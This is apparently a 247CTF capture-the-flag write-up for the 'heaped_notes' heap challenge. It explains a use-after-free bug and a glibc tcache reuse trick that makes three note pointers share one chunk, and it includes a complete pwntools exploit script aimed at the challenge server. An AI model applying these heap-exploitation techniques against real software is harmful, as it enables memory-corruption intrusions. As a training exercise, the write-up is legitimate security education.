# heaped_notes - 247CTF PWN Challenge

## Challenge Info
- **Name**: heaped_notes
- **Category**: PWN (Heap)
- **Remote**: `tcp://85ab7aea87f63982.247ctf.com:50014`
- **Description**: "Can you abuse our heaped notes service to create 3 identical notes?"

## Flag
```
247CTF{XXXXXXXXXXXXXXXXXXXX}
```

---

## Binary Analysis

### File Info
```
ELF 64-bit LSB PIE executable, x86-64
Dynamically linked, stripped
```

### Commands Available
- `small` - Create small note (size 1-32)
- `medium` - Create medium note (size 1-64)
- `large` - Create large note (size 1-128)
- `print` - Print notes
- `flag` - Get flag (if conditions met)

### Global Pointers
```
0x202030 - small_ptr
0x202038 - medium_ptr
0x202040 - large_ptr
```

### Flag Function Logic
```c
void flag() {
    if (small_ptr != NULL &&
        medium_ptr != NULL &&
        large_ptr != NULL &&
        small_ptr == medium_ptr &&
        medium_ptr == large_ptr) {
        // Read and print flag.txt
    } else {
        puts("Sorry, flag is currently unavailable");
    }
}
```

**Condition**: All 3 pointers must be non-NULL AND point to the same address.

---

## Vulnerability

Each note function has a **Use-After-Free (UAF)** bug:

```c
void small() {
    int size;
    puts("Enter the size of your small note:");
    scanf("%d", &size);

    if (size > 0 && size <= 32) {
        small_ptr = malloc(size + 1);
        fgets(small_ptr, size, stdin);
    } else {
        puts("Invalid small note size");
        if (small_ptr != NULL) {
            free(small_ptr);  // Free the chunk...
            // BUT pointer is NOT set to NULL!
        }
    }
}
```

When an invalid size is provided:
1. The existing chunk is `free()`d
2. The pointer is **NOT** set to NULL (dangling pointer)
3. The freed chunk goes to tcache

---

## Exploitation

### Tcache Reuse Attack

Since freed chunks go to tcache and pointers aren't cleared, we can:

1. **Allocate small note** (size 24) → malloc returns address A, stored in `small_ptr`
2. **Free small** (invalid size 0) → chunk A goes to tcache, `small_ptr` still = A
3. **Allocate medium note** (size 24) → tcache returns A, stored in `medium_ptr`
4. **Free medium** (invalid size 0) → chunk A goes to tcache again, `medium_ptr` still = A
5. **Allocate large note** (size 24) → tcache returns A, stored in `large_ptr`

**Result**: `small_ptr == medium_ptr == large_ptr == A`

All three pointers point to the same heap address, satisfying the flag condition!

### Why This Works

- tcache (Thread Cache) in glibc stores recently freed chunks
- When malloc is called with same size, tcache returns the cached chunk
- The program doesn't clear pointers after free (UAF vulnerability)
- Same chunk can be "owned" by all three pointers simultaneously

---

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

HOST = "85ab7aea87f63982.247ctf.com"
PORT = 50014

def exploit():
    io = remote(HOST, PORT)

    # 1. Create small note with valid size
    io.sendlineafter(b"command:", b"small")
    io.sendlineafter(b"note:", b"24")
    io.sendlineafter(b"data:", b"AAAA")

    # 2. Free small with invalid size (pointer not cleared)
    io.sendlineafter(b"command:", b"small")
    io.sendlineafter(b"note:", b"0")

    # 3. Create medium note - tcache returns same address
    io.sendlineafter(b"command:", b"medium")
    io.sendlineafter(b"note:", b"24")
    io.sendlineafter(b"data:", b"BBBB")

    # 4. Free medium with invalid size
    io.sendlineafter(b"command:", b"medium")
    io.sendlineafter(b"note:", b"0")

    # 5. Create large note - tcache returns same address
    io.sendlineafter(b"command:", b"large")
    io.sendlineafter(b"note:", b"24")
    io.sendlineafter(b"data:", b"CCCC")

    # 6. Get flag - all 3 pointers point to same address
    io.sendlineafter(b"command:", b"flag")

    response = io.recvall(timeout=3)
    print(response.decode(errors='ignore'))
    io.close()

if __name__ == "__main__":
    exploit()
```

---

## Key Takeaways

1. **Use-After-Free**: Freeing memory without clearing the pointer creates dangling pointers
2. **tcache reuse**: Same-sized allocations can return previously freed chunks
3. **Heap feng shui**: Careful ordering of alloc/free can make multiple pointers reference the same memory
4. **Security fix**: Always set pointers to NULL after free (`ptr = NULL`)

---

## Files
- `heaped_notes` - Challenge binary
- `solve.py` - Working exploit script
- `flag.txt` - Captured flag
